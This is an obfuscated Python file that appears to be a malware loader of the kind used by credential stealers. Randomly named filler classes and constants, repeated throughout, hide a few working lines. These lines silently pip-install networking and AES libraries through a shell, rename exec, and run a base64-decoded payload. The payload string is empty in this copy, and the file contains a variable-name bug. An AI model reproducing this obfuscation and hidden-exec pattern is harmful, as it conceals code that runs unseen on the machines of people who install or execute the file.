

from sys import executable, stderr
lHJLU0Qm9Q = 49431975
qeow1La3Ij = 11890402
Tcqj2tkiGN = 73555186
class ndI2hAqWWb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BFVMLt5hIl = 72036793
oMty8nhSwU = 23093768
["'ybOQyYg8D6'"]
Q5l4oILYQ0 = 41983236
class V7w70Vk5HB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'CB1fZPM', 'age': 72}
class ufIXpHrpnu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class el9TeTtOqW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ABItCF8aY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RD2Zow8695:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ALuXKKRDN4 = 48137310
qGc93lqDsg = 88195453
class QawOFgxlE2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class BEhUUI9W9X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'H8tdtKSHi3'
class hQ6Uv4KuJq:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
wcuduoH7ll = 66137907
mjd5uqz4YO = 67513143
class eiChaoIUaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
lHJLU0Qm9Q = 49431975
qeow1La3Ij = 11890402
Tcqj2tkiGN = 73555186
class ndI2hAqWWb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BFVMLt5hIl = 72036793
oMty8nhSwU = 23093768
["'ybOQyYg8D6'"]
Q5l4oILYQ0 = 41983236
class V7w70Vk5HB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'CB1fZPM', 'age': 72}
class ufIXpHrpnu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class el9TeTtOqW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ABItCF8aY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RD2Zow8695:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ALuXKKRDN4 = 48137310
qGc93lqDsg = 88195453
class QawOFgxlE2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class BEhUUI9W9X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'H8tdtKSHi3'
class hQ6Uv4KuJq:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
wcuduoH7ll = 66137907
mjd5uqz4YO = 67513143
class eiChaoIUaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
szINvjW3amSsd3fBnniOnIuAH3RqT5sSdgEVxr = exec
lHJLU0Qm9Q = 49431975
qeow1La3Ij = 11890402
Tcqj2tkiGN = 73555186
class ndI2hAqWWb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BFVMLt5hIl = 72036793
oMty8nhSwU = 23093768
["'ybOQyYg8D6'"]
Q5l4oILYQ0 = 41983236
class V7w70Vk5HB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'CB1fZPM', 'age': 72}
class ufIXpHrpnu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class el9TeTtOqW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ABItCF8aY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RD2Zow8695:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ALuXKKRDN4 = 48137310
qGc93lqDsg = 88195453
class QawOFgxlE2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class BEhUUI9W9X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'H8tdtKSHi3'
class hQ6Uv4KuJq:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
wcuduoH7ll = 66137907
mjd5uqz4YO = 67513143
class eiChaoIUaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
FCZWy4vvaQnQeZPFT6GxYRijzJRlklYxtTYBjI=""
szINvjW3amSsd3fBnniOnIuAH3RqT5sSdgEVxr(base64.b64decode(FCZWy4vvaQnQeZPFT6GxYRijzJRlklYxtTYBjI))
lHJLU0Qm9Q = 49431975
qeow1La3Ij = 11890402
Tcqj2tkiGN = 73555186
class ndI2hAqWWb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
BFVMLt5hIl = 72036793
oMty8nhSwU = 23093768
["'ybOQyYg8D6'"]
Q5l4oILYQ0 = 41983236
class V7w70Vk5HB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'CB1fZPM', 'age': 72}
class ufIXpHrpnu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class el9TeTtOqW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ABItCF8aY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RD2Zow8695:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ALuXKKRDN4 = 48137310
qGc93lqDsg = 88195453
class QawOFgxlE2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class BEhUUI9W9X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'H8tdtKSHi3'
class hQ6Uv4KuJq:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
wcuduoH7ll = 66137907
mjd5uqz4YO = 67513143
class eiChaoIUaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
